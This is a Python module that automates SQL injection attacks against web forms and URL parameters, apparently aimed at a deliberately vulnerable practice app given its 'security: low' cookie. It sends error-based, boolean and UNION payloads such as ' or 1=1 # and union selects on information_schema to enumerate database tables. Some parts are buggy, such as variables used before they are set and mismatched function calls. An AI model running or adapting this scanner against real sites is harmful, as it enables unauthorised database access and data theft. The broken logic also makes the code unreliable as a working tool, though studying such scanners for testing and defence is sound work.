import requests
import os
import re
import base64
import json
import time
from urllib.request import Request, urlopen
import urllib.request
from urllib.parse import quote
from bs4 import BeautifulSoup

cookies = {'PHPSESSID':'cnav05h5ltgj1f5eqaorvq01v2', 'security':'low'}


def make_GET_form(url: str):
    dic = {}
    dic['vuln'] = ' SQL'
    dic['method'] = 'GET'
    dic['url'] = url
    return dic


def make_POST_form(url: str, data: dict):
    dic = {}
    dic['vuln'] = 'SQL'
    dic['method'] = 'POST'
    dic['url'] = url
    dic['data'] = data
    return dic


def get_request(data, dic, target):
    global cookies
    key_list = list(dic.keys())
    for payload_name in key_list:
        tmp = dic
        tmp[payload_name] = tmp[payload_name]+'@@@@@@'
        middle_form = target
        key_list_tmp = list(tmp.keys())
        for idx, key in enumerate(key_list_tmp):
            if idx == 0:
                middle_form = middle_form + '?' + key + '=' + tmp[key]
            else:
                middle_form = middle_form + '&' + key + '=' + tmp[key]
        blind_boolean(middle_form)
        union(target, middle_form)
        for payload in data:
            final_form = middle_form.replace('@@@@@@', payload.strip())
            test_res = requests.get(final_form, cookies=cookies)
            if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
                return make_GET_form(final_form)
    return False

def blind_boolean(middle_form):
    t= open(os.path.dirname(os.path.realpath(__file__)) + '/sql_true.txt', "r")
    f= open(os.path.dirname(os.path.realpath(__file__)) + '/sql_false.txt', "r")
    while True:
        true_payload = t.readline()
        if not true_payload:
            t.close()
            f.close()
            break
        test_form1 = middle_form.replace('@@@@@@', true_payload.strip()) #true
        form1_res = requests.get(test_form1,cookies=cookies)

        false_payload = f.readline()
        test_form2 = middle_form.replace('@@@@@@', false_payload.strip()) #false
        form2_res = requests.get(test_form2,cookies=cookies)

        if (abs(len(form1_res.text) - len(form2_res.text)) > 20) or (str(BeautifulSoup(form1_res.text,"html.parser"))!= str(BeautifulSoup(form2_res.text,"html.parser"))):
            t.close()
            f.close()
            return make_GET_form(test_form2)
    return False

def col_num(arg1, arg2):
    cnt=1
    f = open(os.path.dirname(os.path.realpath(__file__)) + '/sql_union.txt', "r")
    payload1 = f.readline()
    payload2 = None

    if arg1 == 'get':
        middle_form=arg2
        #check number of column
        while True:
            test_form1 = middle_form.replace('@@@@@@', quote(payload1.strip()))
            res1 = requests.get(test_form1,cookies=cookies)
            payload1 = f.readline()
    
            payload2 = payload1
            if payload2 == '':
                break
            test_form2 = middle_form.replace('@@@@@@', quote(payload2.strip()))
            res2 = requests.get(test_form2,cookies=cookies)

            if res1.text != res2.text:
                payload3 = f.readline()
                test_form3 = middle_form.replace('@@@@@@', quote(payload3.strip()))
                res3 = requests.get(test_form3,cookies=cookies)
            
                if res2.text == res3.text:
                    col=cnt
                    return col, payload1.strip()
                else:
                    col=cnt+1
                    return col, payload2.strip()
            else:
                cnt=cnt+1

    elif arg1.startswith('http'):
        target = arg1
        union_form = arg2
        key_list = list(union_form.keys())
        for payload_name in key_list:
            while True:
                union_form1 = union_form[payload_name].replace(union_form[payload_name], payload1.strip())
                res1 = requests.post(target,data=union_form1,cookies=cookies)
                payload1 = f.readline()

                payload2 = payload1
                if payload2 == '':
                    break
                union_form2 = union_form[payload_name].replace(union_form[payload_name], payload2.strip())
                res2 = requests.post(target,data=union_form2,cookies=cookies)

                if res1.text != res2.text:
                    payload3 = f.readline()
                    union_form3 = union_form[payload_name].replace(union_form[payload_name], payload3.strip())
                    res3 = requests.post(target,data=union_form3,cookies=cookies)
            
                    if res2.text == res3.text:
                        col=cnt
                        return col, payload1.strip()
                    else:
                        col=cnt+1
                        return col, payload2.strip()
                else:
                    cnt=cnt+1
    f.close()
    return False

def union(target, middle_form):
    if col_num('get',middle_form) != False:
        col, payload = col_num('get',middle_form)
        #NON blind get table info
        origin = requests.get(target,cookies=cookies).text
        if col == 1:
            table_form = middle_form.replace('@@@@@@', quote('\' union select table_schema from information_schema.tables #'))
            table_res = requests.get(table_form,cookies=cookies)
            if abs(len(table_res.text) - len(origin)) >70:
                return make_GET_form(table_form)
        elif col ==2:
            table_form = middle_form.replace('@@@@@@', quote('\' union select table_name,table_schema from information_schema.tables #'))
            table_res = requests.get(table_form,cookies=cookies)
            if abs(len(table_res.text) - len(origin)) >75:
                return make_GET_form(table_form)
        else:
            payload = payload.replace('2','table_name')
            payload = payload.replace(col,'\' union select table_name,table_schema from information_schema.tables ')

            table_form = middle_form.replace('@@@@@@', quote(payload))
            table_res = requests.get(table_form,cookies=cookies)
            if abs(len(table_res.text) - len(origin)) >75:
                return make_GET_form(table_form)
    return False

def scan_type1(url: str, params: dict):
    global cookies
    with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r") as f:
        data = f.readlines()

    for items in params.values():
        target = url + items['action']
        method = items['method']
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']

        if method == 'post':
            key_list = list(dic.keys())
            tmp = dic.copy()
            #error_based
            for payload_name in key_list:
                query_error = dic.copy()
                for payload in data:
                    query_error[payload_name]=tmp[payload_name]+payload.strip()
                    test_res = requests.post(target, data=query_error, cookies=cookies)
                    if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
                        return make_POST_form(target, query_error)
                #boolean
                tmp=dic.copy()

                test_form1=tmp
                test_form2=tmp

                test_form1[payload_name] = tmp[payload_name]+"' or 1=1 #" #true
                form1_post = requests.post(target,data=test_form1,cookies=cookies)
                form1_get = requests.get(target, params=test_form1,cookies=cookies)

                test_form2[payload_name] = test_form1[payload_name].replace("' or 1=1 #", "' or 1=2 #") #false
                form2_post = requests.post(target,data=test_form2,cookies=cookies)
                form2_get = requests.get(target, params=test_form2,cookies=cookies)

                if (abs(len(str(BeautifulSoup(form1_post.text,"html.parser")))-len(str(BeautifulSoup(form2_post.text,"html.parser"))))>20) or (str(BeautifulSoup(form1_post.text,"html.parser"))!=str(BeautifulSoup(form2_post.text,"html.parser"))):
                    return make_POST_form(target, test_form2)
                else:
                    if (abs(len(str(BeautifulSoup(form1_get.text,"html.parser"))) - len(str(BeautifulSoup(form2_get.text,"html.parser"))))>20) or (str(BeautifulSoup(form1_get.text,"html.parser"))!=str(BeautifulSoup(form2_get.text,"html.parser"))):
                        return make_POST_form(target, test_form2)
            #union
            union_tmp=dic.copy()
            if col_num(target, union_tmp) != False:
                origin = requests.post(target,data=dic,cookies=cookies).text
                col, union_payload = col_num(target, union_tmp)
                for payload_name in key_list:
                    if col ==1:
                        table_form = union_tmp[payload_name].replace(union_tmp[payload_name], '\' union select table_schema from information_schema.tables #')
                        table_res = requests.post(target,data=table_form,cookies=cookies)
                        #need to change how to know the attack is success
                        if abs(len(table_res.text) - len(origin)) >70:
                            return make_POST_form(table_form)
                    elif col ==2:
                        table_form = table_form[payload_name].replace(table_form[payload_name], '\' union select table_name,table_schema from information_schema.tables #')
                        table_res = requests.post(target,data=table_form,cookies=cookies)
                        if abs(len(table_res.text) - len(origin)) >75:
                            return make_POST_form(table_form)
                    else:
                        union_payload = union_payload.replace('2','table_name')
                        union_payload = union_payload.replace(col,'\' union select table_name,table_schema from information_schema.tables ')
                        table_form = union_tmp[payload_name].replace(union_tmp[payload_name], union_payload)
                        table_res = table_res = requests.post(target,data=table_form,cookies=cookies)
                        if abs(len(table_res.text) - len(origin)) >75:
                            return make_POST_form(table_form)

        elif method == 'get':
            return get_request(data, dic, target)
        else:
            print('Error in ' + target + ', method type must be assigned')
            return False
    return False


def scan_type2(url: str):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r") as f:
        data = f.readlines()

    params = re.split('[=&?]', url)
    target = params[0]
    del (params[0])
    key = ''
    dic = {}
    for i in range(len(params)):
        if i % 2 == 0:
            key = params[i]
        else:
            dic[key] = params[i]

    return get_request(data, dic, target)

def check_success(res):         
    check_list = {"SQL syntax","valid MySQL","warning: mysql","ODBC Microsoft Access Driver","java.sql.SQLException","XPathException","valid ldap","javax.naming.NameNotFoundException","unclosed quotation mark after the character string", "quoted string not properly terminated","SQL Server","syntax error","XPATH syntax error","OLE DB provider","Microsoft SQL Server","OleDb.OleDbException","Microsoft SQL Native Client error"}
    for wrd in check_list:
        if re.search(wrd, res):
            return True
    return False


def sqli_attack(arg1: str, arg2):
    if arg1.startswith('http'):
        return scan_type1(arg1, arg2)
    elif arg1 == 'get':
        return scan_type2(arg2)
    else:
        print('Error in sql_attack')
        return False